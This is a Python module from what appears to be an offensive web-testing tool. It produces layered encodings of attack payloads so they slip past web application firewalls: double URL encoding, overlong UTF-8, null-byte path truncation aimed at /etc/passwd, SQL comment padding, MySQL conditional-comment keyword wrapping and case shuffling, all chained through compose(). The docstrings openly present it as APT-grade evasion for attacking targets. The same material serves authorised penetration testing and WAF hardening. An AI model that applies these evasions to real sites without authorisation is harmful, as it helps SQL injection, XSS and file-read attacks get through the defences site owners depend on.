"""Multi-layer encoding cascades for WAF evasion.

Real WAFs pattern-match on decoded payloads AFTER a single URL-decode
pass, but many tools / middlewares decode again inside the application.
An APT-grade attacker layers encodings so the WAF sees innocuous bytes
but the ultimate consumer (PHP, the DB, the template engine) sees the
attack.

Encoding layers supported
-------------------------
    url         %XX  percent-encoding
    url2        %25XX  double percent-encoding (bypass single-pass WAFs)
    url_unicode %u00XX  IIS-style unicode (some WAFs miss)
    utf8_overlong  overlong UTF-8 byte sequences for ASCII chars
    html_entity &#NN; or &name; (useful when payload lands in HTML context)
    html_entity_hex &#xNN; hex variant
    hex         \\xNN PHP-string hex escape
    unicode_esc \\uNNNN JavaScript-style unicode escape
    base64      base64(payload) — usually wrapped in a decoder
    null_byte   insert %00 at key positions (PHP null-byte path truncation)
    case_mutate SeLeCt-style case shuffling for keyword-based WAFs
    comment_pad /**/ comment insertion between tokens (SQL especially)

We expose compose() so we can chain them: encode `'` as
url(url(hex())) for example.

Design principle
----------------
This library is a COMPONENT — it produces payload variants. Higher-
level modules (mutate, statistical) drive which combinations to try
against a target. We don't reason about the target here; we just
produce deterministic encodings of input strings.
"""

from __future__ import annotations

import base64
import html
import random
import re
import urllib.parse
from typing import Callable, Dict, Iterable, List, Optional


# ── URL encodings ─────────────────────────────────────────────────


def url(s: str, safe: str = "") -> str:
    """Standard percent-encoding."""
    return urllib.parse.quote(s, safe=safe)


def url2(s: str) -> str:
    """Double-URL encode. Bypasses WAFs that decode once then pattern-match."""
    return urllib.parse.quote(url(s), safe="")


def url_unicode(s: str) -> str:
    """IIS-style unicode escape %uNNNN per character.

    Many older WAFs normalize this; modern ones sometimes miss it
    when it's chained with other encodings.
    """
    return "".join(f"%u{ord(c):04x}" for c in s)


# ── UTF-8 tricks ──────────────────────────────────────────────────


def utf8_overlong(s: str) -> str:
    """Overlong UTF-8 encode each ASCII char as 2-byte sequence.

    RFC 3629 forbids overlong encodings but some parsers still accept
    them. A single quote ' (0x27) becomes %C0%A7 instead of %27.
    """
    out: List[str] = []
    for c in s:
        cp = ord(c)
        if cp < 0x80:
            # 2-byte overlong: 110xxxxx 10xxxxxx
            b1 = 0xC0 | (cp >> 6)
            b2 = 0x80 | (cp & 0x3F)
            out.append(f"%{b1:02X}%{b2:02X}")
        else:
            out.append(c)
    return "".join(out)


# ── HTML entity encodings ─────────────────────────────────────────


def html_entity(s: str) -> str:
    """Decimal HTML entity encoding. `<` → `&#60;`."""
    return "".join(f"&#{ord(c)};" for c in s)


def html_entity_hex(s: str) -> str:
    """Hex HTML entity encoding. `<` → `&#x3C;`."""
    return "".join(f"&#x{ord(c):X};" for c in s)


def html_escape(s: str) -> str:
    """Named-entity HTML escape for < > & ' ".

    Used when the payload will land in HTML context and we want
    to bypass simple HTML sanitizers.
    """
    return html.escape(s, quote=True)


# ── Hex / unicode escapes ────────────────────────────────────────


def hex_escape(s: str) -> str:
    r"""PHP/JS-style hex-escape each char: `'` → `\x27`."""
    return "".join(f"\\x{ord(c):02x}" for c in s)


def js_unicode_escape(s: str) -> str:
    r"""JavaScript `\uNNNN` per char."""
    return "".join(f"\\u{ord(c):04x}" for c in s)


# ── Base64 ───────────────────────────────────────────────────────


def b64(s: str) -> str:
    """Raw base64. Usually wrapped in `eval(base64_decode(...))`."""
    return base64.b64encode(s.encode()).decode()


# ── Null-byte injection ──────────────────────────────────────────


def null_byte_after(s: str, marker: str = ".") -> str:
    """Insert %00 after the marker. Classic PHP file-path truncation:
    ``/etc/passwd%00.jpg`` passes an .jpg suffix check but PHP sees
    /etc/passwd on some older php-cgi versions.
    """
    i = s.find(marker)
    if i < 0:
        return s + "%00"
    return s[:i] + "%00" + s[i:]


# ── Case + comment mutations ─────────────────────────────────────


def case_mutate(s: str, rng: Optional[random.Random] = None) -> str:
    """Randomly upper/lowercase each alpha char.

    `SELECT` becomes things like `SeLeCt`, `sElEcT`. Defeats naive
    keyword-list WAFs that check for exact-case substrings.
    """
    rng = rng or random.Random()
    return "".join(c.upper() if rng.random() > 0.5 else c.lower()
                   if c.isalpha() else c for c in s)


def comment_pad(s: str, comment: str = "/**/") -> str:
    """Insert `/**/ ` (or custom comment) between each pair of alpha runs.

    `UNION SELECT` → `UNION/**/SELECT`. The SQL parser treats /**/ as
    whitespace; WAFs that do token-splitting on literal whitespace
    miss it.
    """
    # Insert comment between every two adjacent alpha runs separated
    # by whitespace — and replace whitespace itself between alpha runs.
    return re.sub(r"\s+", comment, s)


def sql_keyword_obfuscate(s: str) -> str:
    """MySQL-specific conditional comment: `/*!50000SELECT*/`.

    Only MySQL parses these; WAFs that don't know the MySQL dialect
    treat them as regular comments and miss the keyword inside.
    """
    # Wrap every SQL keyword we find in /*!50000 ... */.
    def _rep(m: re.Match) -> str:
        return f"/*!50000{m.group(0)}*/"
    keywords = (
        r"\b(SELECT|UNION|FROM|WHERE|OR|AND|INSERT|UPDATE|DELETE|DROP"
        r"|JOIN|LIMIT|ORDER|BY|GROUP|HAVING|SLEEP|BENCHMARK|LOAD_FILE"
        r"|INTO|OUTFILE|DUMPFILE|INFORMATION_SCHEMA|DATABASE|USER"
        r"|VERSION|CONCAT|SUBSTRING|IF|CASE|WHEN|THEN|ELSE|END)\b"
    )
    return re.sub(keywords, _rep, s, flags=re.IGNORECASE)


# ── Whitespace tricks ────────────────────────────────────────────


def whitespace_mutate(s: str, rng: Optional[random.Random] = None) -> str:
    """Replace ordinary spaces with semantically-equivalent whitespace.

    SQL considers \\t \\r \\n \\v \\f as token separators equal to
    space; some WAFs only look for literal space.
    """
    rng = rng or random.Random()
    alternatives = ["\t", "\n", "\r", "\v", "\f", "/**/", "%09", "%0a", "%0b", "%0d"]
    out = []
    for c in s:
        if c == " ":
            out.append(rng.choice(alternatives))
        else:
            out.append(c)
    return "".join(out)


# ── HTTP Parameter Pollution helper ──────────────────────────────


def hpp(params: Dict[str, str]) -> str:
    """Produce a URL-encoded query string with parameter repeats.

    Given {'id': '1', 'id2': '2'}, returns `id=1&id2=2` (ordinary).
    For HPP exploitation the CALLER constructs a dict with intentional
    duplicates — e.g. pass a list of 2-tuples instead of a dict to
    this helper. Kept as a sentinel for the mutation driver.
    """
    if isinstance(params, list):
        pairs = params
    else:
        pairs = list(params.items())
    return "&".join(f"{url(k)}={url(v)}" for k, v in pairs)


# ── Composition ─────────────────────────────────────────────────


_ENCODER_REGISTRY: Dict[str, Callable[[str], str]] = {
    "url":            url,
    "url2":           url2,
    "url_unicode":    url_unicode,
    "utf8_overlong":  utf8_overlong,
    "html_entity":    html_entity,
    "html_entity_hex": html_entity_hex,
    "html_escape":    html_escape,
    "hex":            hex_escape,
    "unicode":        js_unicode_escape,
    "b64":            b64,
    "case":           case_mutate,
    "comment":        comment_pad,
    "sql_keyword":    sql_keyword_obfuscate,
    "whitespace":     whitespace_mutate,
}


def compose(layers: Iterable[str]) -> Callable[[str], str]:
    """Return a function that applies the named encoders in order.

    compose(["case", "comment", "url"]) applied to "SELECT 1" does:
      case("SELECT 1")      -> "SeLeCt 1"
      comment("SeLeCt 1")   -> "SeLeCt/**/1"
      url("SeLeCt/**/1")    -> "SeLeCt%2F%2A%2A%2F1"

    Unknown layers raise KeyError so typos fail loud.
    """
    fns = [_ENCODER_REGISTRY[name] for name in layers]

    def _apply(s: str) -> str:
        for f in fns:
            s = f(s)
        return s

    return _apply


def available_encoders() -> List[str]:
    """List the registered encoder names."""
    return sorted(_ENCODER_REGISTRY.keys())
